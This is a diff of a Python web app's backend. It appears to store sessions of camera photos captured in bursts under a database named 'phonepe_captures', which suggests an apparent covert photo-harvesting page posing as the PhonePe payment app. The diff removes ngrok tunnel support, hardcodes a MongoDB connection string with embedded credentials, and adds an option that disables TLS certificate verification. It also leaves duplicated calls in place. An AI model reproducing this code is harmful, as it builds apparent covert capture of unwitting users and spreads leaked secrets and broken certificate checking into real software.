@@ -31,18 +31,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Try to import ngrok
-ngrok = None
-NGROK_AVAILABLE = False
-try:
-    from pyngrok import ngrok
-    NGROK_AVAILABLE = True
-    print("✅ Ngrok library loaded successfully")
-except ImportError as e:
-    print(f"⚠️  Ngrok not available: {e}")
-    print("💡 To enable public URLs, install with: pip install pyngrok")
-    print("   Then run: ngrok config add-authtoken YOUR_TOKEN")
-
 # Configuration
 PHOTOS_DIR = 'captured_photos'
 LEFTOVER_DIR = os.path.join(PHOTOS_DIR, 'leftover_data')
@@ -78,20 +66,19 @@ MONGO_URI = os.environ.get('MONGO_URI', 'mongodb+srv://surajorg48:RkEwKhSN2vKkYu
 db = None
 if MONGO_URI:
     try:
-        # Add timeouts to prevent the UI from hanging if DB is slow
+        # Optimized for Render/Vercel with SSL fix
         client = MongoClient(
             MONGO_URI, 
-            serverSelectionTimeoutMS=2000, # 2 seconds max wait
-            connectTimeoutMS=2000,
-            retryWrites=True
+            serverSelectionTimeoutMS=3000,
+            tlsCAFile=ca, 
+            tlsAllowInvalidCertificates=True
         )
         db = client['phonepe_captures']
-        # Quick check if connection is actually working
         client.admin.command('ping')
         logger.info("✅ MongoDB Atlas connected successfully")
     except Exception as e:
-        logger.error(f"⚠️ MongoDB connection issue (App will use local backup): {e}")
-        db = None # Fallback to local
+        logger.error(f"⚠️ MongoDB Issue: {e}")
+        db = None
 else:
     logger.warning("⚠️  MONGO_URI not set. Metadata will be saved locally.")
 
@@ -187,27 +174,38 @@ def get_sessions():
     process_dir(PHOTOS_DIR, is_leftover=False)
     process_dir(LEFTOVER_DIR, is_leftover=True)
 
-    # Add sessions from MongoDB if configured
+    process_dir(PHOTOS_DIR, is_leftover=False)
+    process_dir(LEFTOVER_DIR, is_leftover=True)
+
+    # Cloud Data Sync
     if db is not None:
         try:
-            mongo_sessions = list(db.sessions.find({}, {'_id': 0}))
-            # Merge: MongoDB sessions overwrite local ones if session_id matches
+            mongo_sessions = list(db.sessions.find({}, {'_id': 0}).sort('timestamp', -1))
             for ms in mongo_sessions:
-                # Add a flag to show it's from cloud
                 ms['is_cloud_data'] = True
-                # Check if we already have it from local
+                
+                # If cloud data has 'captured_files', rebuild the 'bursts' for the UI
+                if 'captured_files' in ms:
+                    ms['photo_count'] = len(ms['captured_files'])
+                    ms['bursts'] = {'initial': [], 'middle': [], 'final': []}
+                    for f in ms['captured_files']:
+                        b_type = f.get('burst', 'initial')
+                        if b_type in ms['bursts']:
+                            ms['bursts'][b_type].append(f.get('filename'))
+                
+                # Merge logic
                 exists = False
                 for i, ls in enumerate(sessions):
                     if ls.get('session_id') == ms.get('session_id'):
+                        # Cloud data is more reliable
                         sessions[i] = ms
                         exists = True
                         break
                 if not exists:
                     sessions.append(ms)
         except Exception as e:
-            logger.error(f"❌ Failed to fetch from MongoDB: {e}")
+            logger.error(f"❌ Cloud Sync Error: {e}")
 
-    # Sort by timestamp descending
     sessions.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
     return jsonify(sessions)
 
